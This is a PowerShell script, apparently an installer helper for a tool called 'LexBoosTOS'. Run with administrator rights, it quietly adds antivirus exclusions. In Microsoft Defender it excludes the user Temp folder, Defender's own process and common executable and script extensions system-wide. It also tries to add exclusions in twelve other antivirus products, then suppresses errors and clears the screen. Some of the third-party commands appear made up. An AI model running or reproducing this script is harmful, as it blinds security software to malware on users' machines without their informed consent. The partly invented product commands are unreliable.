#Requires -RunAsAdministrator

function Write-Log {
    param([string]$Status, [string]$Message)
    Write-Host "[$Status] $Message"
}

$Folders = @(
    "$env:windir\LexBoosTOS",
    "$env:APPDATA\..\Local\Temp"
)
$Processes = @(
    "explorer.exe",
    "MsMpEng.exe",
    "SearchIndexer.exe"
)
$Extensions = @(
    ".exe", ".sys", ".tmp", ".log",
    ".json", ".config", ".yml", ".ps1", ".cmd", ".bat",
    ".pak", ".vpk", ".wad", ".dat"
)
$SuccessCount = 0

Write-Host "Adding exclusions for the following folders on all detected antivirus..."
foreach ($Folder in $Folders) {
    Write-Host "  - $Folder"
}
Write-Host ""

function LogSuccess { param($av) $global:SuccessCount++ ; Write-Log '+' "$av exclusion added" }
function LogFail    { param($av,$msg) ; Write-Log '-' "$av : $msg" }

# 1. Microsoft Defender
if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
    try {
        $defenderSuccess = $false
        foreach ($Folder in $Folders) {
            Add-MpPreference -ExclusionPath $Folder -ErrorAction SilentlyContinue
        }
        foreach ($Process in $Processes) {
            Add-MpPreference -ExclusionProcess $Process -ErrorAction SilentlyContinue
        }
        foreach ($Extension in $Extensions) {
            Add-MpPreference -ExclusionExtension $Extension -ErrorAction SilentlyContinue
        }
        $defenderSuccess = $true
        if ($defenderSuccess) { LogSuccess "Microsoft Defender" }
    } catch { LogFail "Microsoft Defender" $_.Exception.Message }
}

# OPTIMIZED: Find antivirus executables using registry and common paths (NO recursive search)
function Find-AntivirusExe {
    param($Patterns)

    # Method 1: Check registry uninstall keys (fastest)
    $regPaths = @(
        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    )

    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                    $displayIcon = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayIcon

                    if ($displayName -and $installLocation) {
                        foreach ($pattern in $Patterns) {
                            if ($displayName -like "*$pattern*" -and $installLocation) {
                                $exePath = Join-Path $installLocation $pattern
                                if (Test-Path $exePath) { return $exePath }
                            }
                        }
                    }
                    if ($displayIcon -and $displayIcon -like "*.exe") {
                        foreach ($pattern in $Patterns) {
                            if ($displayIcon -like "*$pattern*") {
                                if (Test-Path $displayIcon) { return $displayIcon }
                            }
                        }
                    }
                } catch { continue }
            }
        }
    }

    # Method 2: Check common installation paths (shallow search, max depth 2)
    $commonPaths = @(
        "${env:ProgramFiles}\BitDefender",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\BitDefender",
        "${env:ProgramFiles}\Kaspersky Lab",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Kaspersky Lab",
        "${env:ProgramFiles}\ESET",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\ESET",
        "${env:ProgramFiles}\AVAST Software",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\AVAST Software",
        "${env:ProgramFiles}\Malwarebytes",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Malwarebytes",
        "${env:ProgramFiles}\Sophos",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Sophos",
        "${env:ProgramFiles}\Norton Internet Security",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Norton Internet Security",
        "${env:ProgramFiles}\Norton 360",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Norton 360",
        "${env:ProgramFiles}\McAfee",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\McAfee",
        "${env:ProgramFiles}\Avira",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Avira",
        "${env:ProgramFiles}\F-Secure",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\F-Secure",
        "${env:ProgramFiles}\Emsisoft",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Emsisoft",
        "${env:ProgramFiles}\Comodo",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\Comodo",
        "${env:ProgramFiles}\ClamWin",
        "$([Environment]::GetFolderPath('ProgramFilesX86'))\ClamWin"
    )

    foreach ($basePath in $commonPaths) {
        if (Test-Path $basePath) {
            foreach ($pattern in $Patterns) {
                # Check root level first (fastest)
                $exePath = Join-Path $basePath $pattern
                if (Test-Path $exePath) { return $exePath }

                # Check one sublevel deep (max)
                $subdirs = Get-ChildItem $basePath -Directory -Depth 1 -ErrorAction SilentlyContinue
                foreach ($subdir in $subdirs) {
                    $exePath = Join-Path $subdir.FullName $pattern
                    if (Test-Path $exePath) { return $exePath }
                }
            }
        }
    }

    return $null
}

# Bitdefender
Write-Log '+' "Checking Bitdefender..."
$bdc = Find-AntivirusExe @("bdc.exe", "BDCore.exe", "bdagent.exe", "vsserv.exe")
if (-not $bdc) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Bitdefender*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*bd*.exe" -or $_.Name -like "*bitdefender*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $bdc = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($bdc) { break }
    }
}
if ($bdc) {
    $bitdefenderSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $bdc exclusion add --path "$Folder" | Out-Null } catch { $bitdefenderSuccess = $false }
    }
    if ($bitdefenderSuccess) { LogSuccess "Bitdefender" } else { LogFail "Bitdefender" "Failed to add some exclusions" }
} else { Write-Log '-' "Bitdefender not found" }

# Kaspersky
Write-Log '+' "Checking Kaspersky..."
$kes = Find-AntivirusExe @("kescli.exe", "avp.exe", "avpui.exe", "kavshell.exe")
if (-not $kes) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Kaspersky*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*avp*.exe" -or $_.Name -like "*kav*.exe" -or $_.Name -like "*kaspersky*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $kes = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($kes) { break }
    }
}
if ($kes) {
    $kasperskySuccess = $true
    foreach ($Folder in $Folders) {
        try { & $kes --add-exclusion --path="$Folder" | Out-Null } catch { $kasperskySuccess = $false }
    }
    if ($kasperskySuccess) { LogSuccess "Kaspersky" } else { LogFail "Kaspersky" "Failed to add some exclusions" }
} else { Write-Log '-' "Kaspersky not found" }

# ESET
Write-Log '+' "Checking ESET..."
$scancfg = Find-AntivirusExe @("scancfg.exe", "ecls.exe", "egui.exe", "ekrn.exe")
if (-not $scancfg) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*ESET*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*eset*.exe" -or $_.Name -like "*egui*.exe" -or $_.Name -like "*ekrn*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $scancfg = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($scancfg) { break }
    }
}
if ($scancfg) {
    $esetSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $scancfg add --exclude="$Folder" | Out-Null } catch { $esetSuccess = $false }
    }
    if ($esetSuccess) { LogSuccess "ESET" } else { LogFail "ESET" "Failed to add some exclusions" }
} else { Write-Log '-' "ESET not found" }

# Avast / AVG
Write-Log '+' "Checking Avast / AVG..."
$ashCmd = Find-AntivirusExe @("ashCmd.exe", "AvastUI.exe", "avastui.exe", "avgui.exe", "avgservice.exe")
if (-not $ashCmd) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Avast*" -or $displayName -like "*AVG*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*avast*.exe" -or $_.Name -like "*avg*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $ashCmd = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($ashCmd) { break }
    }
}
if ($ashCmd) {
    $avastSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $ashCmd /ExclusionAddPath="$Folder" | Out-Null } catch { $avastSuccess = $false }
    }
    if ($avastSuccess) { LogSuccess "Avast / AVG" } else { LogFail "Avast / AVG" "Failed to add some exclusions" }
} else { Write-Log '-' "Avast/AVG not found" }

# Malwarebytes
Write-Log '+' "Checking Malwarebytes..."
$mb = Find-AntivirusExe @("mb.exe", "MBAMService.exe", "mbam.exe", "mbamservice.exe")
if (-not $mb) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Malwarebytes*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*mb*.exe" -or $_.Name -like "*mbam*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $mb = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($mb) { break }
    }
}
if ($mb) {
    $mbSuccess = $true
    foreach ($Folder in $Folders) {
        try { Start-Process (Join-Path (Split-Path $mb -Parent) 'mb.exe') -ArgumentList "--addexclusion", "`"$Folder`"" -Wait -WindowStyle Hidden } catch { $mbSuccess = $false }
    }
    if ($mbSuccess) { LogSuccess "Malwarebytes" } else { LogFail "Malwarebytes" "Failed to add some exclusions" }
} else { Write-Log '-' "Malwarebytes not found" }

# Sophos
Write-Log '+' "Checking Sophos..."
$savconfig = Find-AntivirusExe @("SavConfig.exe", "Sophos Endpoint Defense.exe", "SophosUI.exe", "SophosAgent.exe")
if (-not $savconfig) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Sophos*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*sophos*.exe" -or $_.Name -like "*sav*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $savconfig = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($savconfig) { break }
    }
}
if ($savconfig) {
    $sophosSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $savconfig -addexclusion "$Folder" | Out-Null } catch { $sophosSuccess = $false }
    }
    if ($sophosSuccess) { LogSuccess "Sophos" } else { LogFail "Sophos" "Failed to add some exclusions" }
} else { Write-Log '-' "Sophos not found" }

# Norton / Norton 360
Write-Log '+' "Checking Norton..."
$nav = Find-AntivirusExe @("nav.exe", "navw32.exe", "NortonSecurity.exe", "NS.exe")
if (-not $nav) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Norton*" -or $displayName -like "*Symantec*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*nav*.exe" -or $_.Name -like "*norton*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $nav = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($nav) { break }
    }
}
if ($nav) {
    $nortonSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $nav /EXCLUDE="$Folder" | Out-Null } catch { $nortonSuccess = $false }
    }
    if ($nortonSuccess) { LogSuccess "Norton" } else { LogFail "Norton" "Failed to add some exclusions" }
} else { Write-Log '-' "Norton not found" }

# McAfee
Write-Log '+' "Checking McAfee..."
$mcafee = Find-AntivirusExe @("scan.exe", "McScan.exe", "McAfeeCmd.exe", "mfevtp.exe")
if (-not $mcafee) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*McAfee*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*scan*.exe" -or $_.Name -like "*mcafee*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $mcafee = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($mcafee) { break }
    }
}
if ($mcafee) {
    $mcafeeSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $mcafee -E "$Folder" | Out-Null } catch { $mcafeeSuccess = $false }
    }
    if ($mcafeeSuccess) { LogSuccess "McAfee" } else { LogFail "McAfee" "Failed to add some exclusions" }
} else { Write-Log '-' "McAfee not found" }

# Avira
Write-Log '+' "Checking Avira..."
$avira = Find-AntivirusExe @("avscan.exe", "avcenter.exe", "avguard.exe", "sched.exe")
if (-not $avira) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Avira*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*avira*.exe" -or $_.Name -like "*avscan*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $avira = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($avira) { break }
    }
}
if ($avira) {
    $aviraSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $avira -e "$Folder" | Out-Null } catch { $aviraSuccess = $false }
    }
    if ($aviraSuccess) { LogSuccess "Avira" } else { LogFail "Avira" "Failed to add some exclusions" }
} else { Write-Log '-' "Avira not found" }

# F-Secure
Write-Log '+' "Checking F-Secure..."
$fsav = Find-AntivirusExe @("fsav.exe", "fsav32.exe", "fsguiexe.exe", "fsorsp.exe")
if (-not $fsav) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*F-Secure*" -or $displayName -like "*FSecure*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*fsav*.exe" -or $_.Name -like "*f-secure*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $fsav = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($fsav) { break }
    }
}
if ($fsav) {
    $fsecureSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $fsav --exclude="$Folder" | Out-Null } catch { $fsecureSuccess = $false }
    }
    if ($fsecureSuccess) { LogSuccess "F-Secure" } else { LogFail "F-Secure" "Failed to add some exclusions" }
} else { Write-Log '-' "F-Secure not found" }

# Emsisoft
Write-Log '+' "Checking Emsisoft..."
$emsisoft = Find-AntivirusExe @("a2cmd.exe", "a2service.exe", "EmsisoftAntiMalware.exe", "a2guard.exe")
if (-not $emsisoft) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Emsisoft*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*a2*.exe" -or $_.Name -like "*emsisoft*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $emsisoft = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($emsisoft) { break }
    }
}
if ($emsisoft) {
    $emsisoftSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $emsisoft /exclude="$Folder" | Out-Null } catch { $emsisoftSuccess = $false }
    }
    if ($emsisoftSuccess) { LogSuccess "Emsisoft" } else { LogFail "Emsisoft" "Failed to add some exclusions" }
} else { Write-Log '-' "Emsisoft not found" }

# Comodo
Write-Log '+' "Checking Comodo..."
$comodo = Find-AntivirusExe @("cmdscan.exe", "cavcmd.exe", "ComodoScanner.exe", "cavemsrv.exe")
if (-not $comodo) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*Comodo*" -or $displayName -like "*CIS*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*cmd*.exe" -or $_.Name -like "*comodo*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $comodo = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($comodo) { break }
    }
}
if ($comodo) {
    $comodoSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $comodo -exclude "$Folder" | Out-Null } catch { $comodoSuccess = $false }
    }
    if ($comodoSuccess) { LogSuccess "Comodo" } else { LogFail "Comodo" "Failed to add some exclusions" }
} else { Write-Log '-' "Comodo not found" }

# ClamWin
Write-Log '+' "Checking ClamWin..."
$clamwin = Find-AntivirusExe @("clamscan.exe", "clamscan32.exe", "ClamWin.exe", "clamtray.exe")
if (-not $clamwin) {
    $regPaths = @('HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall', 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall')
    foreach ($regPath in $regPaths) {
        if (Test-Path $regPath) {
            $keys = Get-ChildItem $regPath -ErrorAction SilentlyContinue
            foreach ($key in $keys) {
                try {
                    $displayName = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).DisplayName
                    if ($displayName -like "*ClamWin*" -or $displayName -like "*ClamAV*") {
                        $installLocation = (Get-ItemProperty $key.PSPath -ErrorAction SilentlyContinue).InstallLocation
                        if ($installLocation -and (Test-Path $installLocation)) {
                            $exe = Get-ChildItem $installLocation -Filter "*.exe" -Recurse -Depth 3 -ErrorAction SilentlyContinue | Where-Object { $_.Name -like "*clam*.exe" } | Select-Object -First 1 -ExpandProperty FullName
                            if ($exe) { $clamwin = $exe }
                        }
                        break
                    }
                } catch { continue }
            }
        }
        if ($clamwin) { break }
    }
}
if ($clamwin) {
    $clamwinSuccess = $true
    foreach ($Folder in $Folders) {
        try { & $clamwin --exclude-dir="$Folder" | Out-Null } catch { $clamwinSuccess = $false }
    }
    if ($clamwinSuccess) { LogSuccess "ClamWin" } else { LogFail "ClamWin" "Failed to add some exclusions" }
} else { Write-Log '-' "ClamWin not found" }

# === End of script - Final display ===
Clear-Host
if ($SuccessCount -gt 0) {
    Write-Log '+' "LexBoosTOS exclusion added successfully!"
} else {
    Write-Log '-' "No exclusions could be added."
}

Start-Sleep -Seconds 3
# Exit cleanly
exit 0
